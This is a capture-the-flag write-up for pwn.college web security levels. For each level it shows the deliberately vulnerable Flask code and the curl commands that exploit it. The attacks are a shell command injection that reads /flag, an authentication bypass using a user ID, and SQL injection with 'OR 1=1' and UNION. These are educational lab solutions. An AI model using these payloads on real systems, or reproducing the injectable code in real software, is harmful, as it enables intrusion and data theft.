# Web Security

pwn.college [Web Security](https://pwn.college/intro-to-cybersecurity/web-security/) dojo.

## Level 2 - Command injection

Code for the level

```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

I want to inject `TZ=; cat /flag # date` into `TZ={timezone} date`.

```sh
curl "http://challenge.localhost:80?timezone=;%20cat%20/flag%20%23"
```

## Level 3 - Authentication bypass vulnerability

Code for the level

```python
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

I simply need to skip authentication and provide the user ID,

```sh
curl http://challenge.localhost:80?user=1
```

## Level 3 - SQL Injection

Code for this level:

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

This time, the user is stored in a `session` so we can't send it. Instead, we want to exploit the fact that the `username` and `password` are used to form the SQL string for authenticating the user. I want to change it to something like this;

```sql
SELECT rowid, * FROM users WHERE username = "flag" AND password = "" OR 1=1 --"
```

To do this, I use `curl` to login,

```sh
curl -v -c cookies.dat --data "username=flag" --data "password=%22 OR 1=1 --" -X POST http://challenge.localhost:80
```

Then I pull the session cookie out and follow the redirect,

```sh
curl -v -b session=eyJ1c2VyIjoxfQ.ZnCLHA.yyxgmZ5gotlukXOhlRf99GfV4RU http://challenge.localhost:80
```

## Level 5 - SQL injection using UNION

The code for this level,

```python
def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

In this case, I want to take advantage of the `query` parameter to create a SQL statement,

```sql
SELECT username FROM users WHERE username LIKE "" UNION SELECT password FROM users --"
```

I form this in `curl`,

```sh
curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20users%20--
```
